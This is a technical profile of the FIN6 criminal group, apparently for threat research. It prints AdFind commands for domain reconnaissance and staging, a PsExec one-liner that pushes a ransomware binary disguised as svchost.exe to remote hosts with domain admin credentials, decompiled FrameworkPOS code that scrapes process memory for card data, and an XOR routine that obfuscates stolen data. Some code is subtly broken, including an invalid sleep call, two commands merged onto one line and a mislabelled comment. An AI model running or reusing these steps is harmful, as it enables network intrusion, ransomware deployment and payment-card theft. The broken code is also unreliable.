# FIN6

## Features

1. In intranet penetration, use Adfind to query domain controllers, and then use 7-Zip to compress the results for penetration.

```bash
adfind.exe -f (objectcategory=person) >  ad_users.txt
//Find all people objects in the domain
adfind.exe -f (objectcategory=computer) > ad_computers.txt
//Find all computers in the domain
adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt
//Find all group objects in the domain
adfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt
//Find all subnets in the domain
adfind.exe -f "(objectcategory=group)" > ad_group.txt
//Find all groups in the domain
adfind.exe -gcb -sc trustdmp >  ad_trustdmp.txt
//Find trusted objects in the domain
7.exe a -mx3 ad.7z ad_*
```

2. When moving horizontally, the existing domain administrator credentials will be used to distribute the blackmail virus.

```bash
start copy svchost.exe \\10.1.1.1\c$\windows\temp\start psexec.exe \\10.1.1.1 -u [Domain\Domain Administrator] -p "password" -d -h -r mstdc -s -accepteula -nobanner c:\windows\temp\svchost.exe
```

3. FrameworkPOS malware creates threads to build communication protocols and retrieve host information during execution.

```C
CreateThread(0, 0, (LPTHREAD_START_ROUTINE)caller, 0, 0, 0);
//Create thread
while ( 1 )
{
  time(&v11);
  hSnapshot = CreateToolhelp32Snapshot(2u, 0);
  //Create a snapshot for the specified process, heap, module and thread by obtaining the information of the specified process
  if ( hSnapshot == (HANDLE)-1 )
    return 0;
  pe.dwSize = 296;

  if ( !Process32First(hSnapshot, &pe) )
    break;
  do
  {
    v8 = 0;
    for ( j = 0; j < 0x14; ++j )
    {
      if ( !strcmp(pe.szExeFile, &aWininit_exe[24 * j]) || strstr(byte_592010, pe.szExeFile) )
      //Blacklist Wininit.exe to speed up memory scanning
      {
        v8 = 1;
        break;
      }
    }
    if ( !v8 )
    {
      if ( pe.th32ProcessID )
      {
        dwProcessId = pe.th32ProcessID;
        v14 = 1;
        dword_592514 = 0;
        byte_59136B = 0;
        v89 = check_virtualQuery_ex(pe.th32ProcessID, 1);
        if ( v89 )
        {
          scan_memoryfor_card((int)v89);  //Scan memory
          free((int)v89);
          _sleep(200u);
        }
      }
    }
  }
  while ( Process32Next(hSnapshot, &pe) );
  if ( dword_592410 > 0 )
    _sleep(10000u s);
  CloseHandle(hSnapshot);
  time(&v15);
  v15 -= v11;
  localtime(&v15);
}
```

4. The stolen data will be confused by hard coding technology. First, the XOR of "AA" will be converted to the following string, and then it will be converted to hexadecimal and added to the API call of snprintf.

```C
size_t __cdecl enc_func(char *a1, int a2)
{
  size_t result;
  unsigned int i;
  for ( len_enc = 0; ; ++len_enc )
  {
    result = strlen(a1);
    if ( len_enc >= result )
      break;
    for ( i = 0; i < 69; ++i )
    {
      if ( (unsigned __int8)a1[len_enc] == byte_42E000[i] )
      {
        a1[len_enc] = byte_42E048[i];
        break;
      }
    }
    a1[len_enc] ^= AA_key;
_snprintf((char *)(a2 + 2 * len_enc), 2u, "%.2x", (unsigned __int8)a1[len_enc]);
//Format (unsigned __int8)a1[len_enc] as a string in the format of "%. 2x" and copy it to str
  }
  return result;
}
```
